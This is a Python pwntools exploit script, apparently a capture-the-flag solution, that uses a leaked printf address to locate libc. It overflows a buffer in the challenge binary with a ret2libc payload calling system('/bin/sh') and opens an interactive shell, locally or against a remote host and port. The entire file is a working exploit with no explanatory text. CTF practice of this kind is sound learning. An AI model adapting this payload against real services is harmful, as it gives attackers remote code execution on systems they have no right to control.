#!/usr/bin/env python3
from pwn import *

#PS: put both files "chall" and "libc.so.6" in the same dir
exe=ELF("../challenge/chall")
libc = ELF("../src/libc.so.6")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT = "localhost",1777

context.binary = exe

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True


def main():
    global io
    io = conn()
    l = io.recvline().split(b':')[1].strip()
    libc.address = int(l,16) - libc.symbols['printf']
    bin_sh = next(libc.search(b'/bin/sh\0'))
    print(bin_sh)
    ret_adr = b'BBBB'
    payload = flat(
        44*b'A',
        libc.symbols['system'],
        ret_adr,
        bin_sh
    )
    io.send(payload)
    io.interactive()
    io.close()
    


def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()





